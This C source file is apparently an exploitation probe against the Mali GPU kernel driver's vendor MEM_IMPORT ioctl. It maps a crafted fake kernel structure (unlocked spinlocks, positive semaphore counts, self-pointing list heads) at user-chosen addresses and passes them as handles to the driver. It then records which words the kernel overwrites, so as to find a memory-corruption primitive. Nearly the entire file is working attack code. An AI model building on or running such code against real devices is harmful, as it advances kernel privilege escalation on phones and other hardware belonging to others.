/*
 * mali_exploit_probe2.c — Safe Mali vendor dispatch exploitation probe
 * All dangerous operations in forked children. Higher base addresses.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>

#define MALI_IOC_MAGIC 'M'
#define VENDOR_IOC_MAGIC 0x80
#define UK_FUNC_VERSION_CHECK 0
#define UK_FUNC_MEM_IMPORT    513
#define UK_FUNC_POST_TERM     521

static int mali_handshake(int fd) {
    uint8_t hb[16];
    memset(hb, 0, sizeof(hb));
    *(uint32_t *)hb = UK_FUNC_VERSION_CHECK;
    *(uint8_t *)(hb + 8) = 10;
    if (ioctl(fd, _IOC(3, MALI_IOC_MAGIC, 0, 16), hb) < 0) return -1;
    if (*(uint32_t *)(hb + 4) != 0) return -1;
    memset(hb, 0, sizeof(hb));
    *(uint32_t *)hb = UK_FUNC_POST_TERM;
    ioctl(fd, _IOC(3, MALI_IOC_MAGIC, 0, 16), hb);
    return 0;
}

/* Run a vendor MEM_IMPORT in a forked child, return result via pipe */
struct import_result {
    int ioctl_ret;
    int ioctl_errno;
    uint32_t header_result;
    uint8_t buf_after[48];
    int survived;      /* 1 if ioctl returned */
    int mod_count;     /* number of fake struct words modified */
    uint32_t first_mod_offset;
    uint32_t first_mod_value;
};

static int run_import(uint32_t phandle_lo, uint32_t phandle_hi,
                      uint32_t import_type, int use_fake_struct,
                      struct import_result *res) {
    int pipefd[2];
    pipe(pipefd);

    pid_t pid = fork();
    if (pid == 0) {
        close(pipefd[0]);
        alarm(8);

        struct import_result r;
        memset(&r, 0, sizeof(r));

        void *fake = NULL;
        uint32_t fake_addr = 0;

        if (use_fake_struct && phandle_lo >= 0x8000) {
            /* Map 16 pages at the target address */
            fake_addr = phandle_lo & ~0xFFF;  /* page-align */
            fake = mmap((void *)(uintptr_t)fake_addr, 0x10000,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                        -1, 0);
            if (fake == MAP_FAILED) {
                r.survived = -1;
                write(pipefd[1], &r, sizeof(r));
                close(pipefd[1]);
                _exit(1);
            }

            /* Fill with unlocked-spinlock + positive-count pattern
             * ARM32 ticket spinlock: {owner:u16, next:u16}
             * 0x00010001 = owner=1, next=1 → UNLOCKED
             * As semaphore count: 65537 > 0 → down() succeeds */
            uint32_t *p = (uint32_t *)fake;
            for (int i = 0; i < 0x10000 / 4; i++)
                p[i] = 0x00010001;

            /* Self-referential list_heads at every 8-byte boundary */
            for (uint32_t off = 0; off < 0x10000 - 8; off += 8) {
                uint32_t addr = fake_addr + off;
                *(uint32_t *)((char *)fake + off) = addr;
                *(uint32_t *)((char *)fake + off + 4) = addr;
            }

            /* Re-apply spinlock pattern at 4-byte boundaries not covered */
            for (uint32_t off = 0; off < 0x10000; off += 16) {
                /* Semaphore: lock(4) + count(4) + list_head(8) = 16 bytes */
                *(uint32_t *)((char *)fake + off) = 0x00000000;    /* lock = unlocked */
                *(uint32_t *)((char *)fake + off + 4) = 0x00010001; /* count > 0 */
                uint32_t lh_addr = fake_addr + off + 8;
                *(uint32_t *)((char *)fake + off + 8) = lh_addr;   /* list next = self */
                *(uint32_t *)((char *)fake + off + 12) = lh_addr;  /* list prev = self */
            }
        }

        int fd = open("/dev/mali0", O_RDWR);
        if (fd < 0) {
            r.survived = -2;
            write(pipefd[1], &r, sizeof(r));
            close(pipefd[1]);
            _exit(1);
        }
        mali_handshake(fd);

        uint8_t buf[48];
        memset(buf, 0, sizeof(buf));
        *(uint32_t *)(buf + 0) = UK_FUNC_MEM_IMPORT;
        *(uint32_t *)(buf + 8) = phandle_lo;
        *(uint32_t *)(buf + 12) = phandle_hi;
        *(uint32_t *)(buf + 16) = import_type;

        r.ioctl_ret = ioctl(fd, _IOC(3, VENDOR_IOC_MAGIC, 0, 48), buf);
        r.ioctl_errno = errno;
        r.header_result = *(uint32_t *)(buf + 4);
        memcpy(r.buf_after, buf, 48);
        r.survived = 1;

        /* Check fake struct modifications */
        if (fake && fake != MAP_FAILED) {
            uint32_t *p = (uint32_t *)fake;
            uint32_t expected_patterns[] = {0x00000000, 0x00010001};
            r.mod_count = 0;
            for (uint32_t off = 0; off < 0x10000; off += 4) {
                uint32_t expected;
                int slot = (off % 16) / 4;
                if (slot == 0) expected = 0x00000000;
                else if (slot == 1) expected = 0x00010001;
                else expected = fake_addr + (off & ~0xF) + 8;
                if (slot >= 2) {
                    uint32_t lh_base = fake_addr + (off & ~0xF) + 8;
                    expected = lh_base;
                }

                uint32_t actual = *(uint32_t *)((char *)fake + off);
                if (actual != expected) {
                    if (r.mod_count == 0) {
                        r.first_mod_offset = off;
                        r.first_mod_value = actual;
                    }
                    r.mod_count++;
                }
            }
            munmap(fake, 0x10000);
        }

        close(fd);
        write(pipefd[1], &r, sizeof(r));
        close(pipefd[1]);
        _exit(0);
    }

    close(pipefd[1]);
    int status;
    waitpid(pid, &status, 0);

    struct import_result r;
    memset(&r, 0, sizeof(r));
    int n = read(pipefd[0], &r, sizeof(r));
    close(pipefd[0]);

    if (WIFSIGNALED(status)) {
        r.survived = -(100 + WTERMSIG(status));
    } else if (n < (int)sizeof(r)) {
        r.survived = -200;
    }

    if (res) *res = r;
    return r.survived;
}

int main() {
    printf("=== Mali Vendor Dispatch Exploitation Probe v2 ===\n\n");

    /* TEST 1: NULL phandle baseline */
    printf("--- TEST 1: phandle=0 (NULL) ---\n");
    struct import_result r;
    run_import(0, 0, 2, 0, &r);
    printf("  survived=%d ioctl=%d result=%u\n", r.survived, r.ioctl_ret, r.header_result);

    /* TEST 2: mmap_min_addr */
    printf("\n--- TEST 2: System info ---\n");
    FILE *f = fopen("/proc/sys/vm/mmap_min_addr", "r");
    if (f) { unsigned long v; if(fscanf(f, "%lu", &v)==1) printf("  mmap_min_addr=%lu (0x%lx)\n", v, v); fclose(f); }

    /* TEST 3: Controlled import with fake struct at various addresses */
    printf("\n--- TEST 3: Controlled vendor dispatch (fake struct) ---\n");
    uint32_t addrs[] = {0x10000, 0x40000, 0x100000, 0x200000, 0x1000000};
    for (int i = 0; i < 5; i++) {
        run_import(addrs[i], 0, 2, 1, &r);
        printf("  phandle=0x%x: survived=%d", addrs[i], r.survived);
        if (r.survived == 1) {
            printf(" ioctl=%d result=%u mods=%d",
                   r.ioctl_ret, r.header_result, r.mod_count);
            if (r.mod_count > 0) {
                printf(" first_mod=0x%x→0x%08x",
                       r.first_mod_offset, r.first_mod_value);
            }
        } else if (r.survived < -100) {
            printf(" (signal %d)", -(r.survived + 100));
        }
        printf("\n");
    }

    /* TEST 4: Different import types with fake struct */
    printf("\n--- TEST 4: Import types with fake struct ---\n");
    for (int type = 0; type <= 5; type++) {
        run_import(0x100000, 0, type, 1, &r);
        printf("  type=%d: survived=%d", type, r.survived);
        if (r.survived == 1) {
            printf(" ioctl=%d result=%u mods=%d",
                   r.ioctl_ret, r.header_result, r.mod_count);
        } else if (r.survived < -100) {
            printf(" (signal %d)", -(r.survived + 100));
        }
        printf("\n");
    }

    /* TEST 5: Without fake struct (should crash if below mmap_min_addr) */
    printf("\n--- TEST 5: Without fake struct (higher addr, NO mapping) ---\n");
    printf("  SKIPPING (would crash device if addr unmapped in kernel)\n");

    /* TEST 6: Dump buffer after successful controlled import */
    printf("\n--- TEST 6: Buffer dump after controlled import ---\n");
    run_import(0x100000, 0, 2, 1, &r);
    if (r.survived == 1) {
        printf("  ioctl=%d result=%u\n", r.ioctl_ret, r.header_result);
        for (int i = 0; i < 48; i += 4) {
            printf("  buf[%2d]: 0x%08x", i, *(uint32_t *)(r.buf_after + i));
            if (i == 0) printf("  (func_id)");
            if (i == 4) printf("  (header.id/result)");
            if (i == 8) printf("  (phandle lo)");
            if (i == 12) printf("  (phandle hi)");
            if (i == 16) printf("  (type)");
            if (i == 20) printf("  (padding)");
            if (i == 24) printf("  (gpu_va?)");
            if (i == 28) printf("  (gpu_va_hi?)");
            if (i == 32) printf("  (va_pages?)");
            if (i == 36) printf("  (flags?)");
            printf("\n");
        }
    } else {
        printf("  FAILED: survived=%d\n", r.survived);
    }

    printf("\n=== Done ===\n");
    return 0;
}
